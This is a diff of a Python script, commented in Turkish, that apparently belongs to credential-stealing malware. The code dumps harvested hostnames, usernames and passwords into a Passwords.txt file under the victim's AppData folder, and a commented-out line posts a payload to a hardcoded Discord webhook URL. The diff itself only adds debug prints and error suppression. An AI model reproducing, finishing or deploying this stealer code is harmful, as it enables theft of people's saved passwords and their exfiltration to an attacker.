@@ -979,18 +979,27 @@ password_json_data = json.dumps(PASSWORDS)
 
   
   # Dinamik kullanıcı yolu oluşturma
+print('#1')
 user_profile_path = os.path.expanduser("~")  # Kullanıcının ana dizinini alır
 storage_path = os.path.join(user_profile_path, "AppData", "Roaming", pc_name)
 
 # Klasör mevcut değilse oluştur
 os.makedirs(storage_path, exist_ok=True)
+print('#2')
 password_data = json.loads(password_json_data)
 # Dosya yolu
+print('#3')
 file_path = os.path.join(storage_path + f"\\Password\\", "Passwords.txt")
 folder_path = os.path.dirname(file_path)
 if not os.path.exists(folder_path):
     os.makedirs(folder_path)
-with open(file_path, "w") as file:
+    print('#4')
+
+print('#5')
+
+try:
+ with open(file_path, "w") as file:
+ 
     for entry in password_data:
         # Gerekli bilgileri ayıklamak
         hostname = entry["url"]
@@ -998,11 +1007,14 @@ with open(file_path, "w") as file:
         password = entry["password"]
         
         # Bilgileri dosyaya yazmak
+        print('#6')
         file.write(f"Hostname: {hostname} ")
         file.write(f"Username: {username} ")
         file.write(f"Password: {password} ")
         file.write("\n")  # Yeni bir giriş için boşluk bırak
-
+except:
+ pass
+print('#7')
 
 #response = requests.post('https://discord.com/api/webhooks/1322677956757291090/h-UIa0gM90STGKOEf65dFfLbyYWOWALkbvq5v000-vrStO8-QTy6_WpGkrWmZvlbGfSc', json=payload)
 
